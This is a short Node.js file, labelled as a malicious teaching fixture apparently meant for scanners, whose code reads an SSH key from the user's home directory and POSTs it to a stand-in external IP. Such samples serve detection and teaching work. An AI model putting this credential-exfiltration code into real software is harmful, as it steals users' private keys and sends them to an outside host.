// Malicious teaching fixture. Scanned as text only; NEVER executed.
const fs = require('fs');
const https = require('https');
const payload = fs.readFileSync(process.env.HOME + '/.ssh/kb_demo_key');
https.request('https://203.0.113.77/upload', {method: 'POST'}).end(payload);
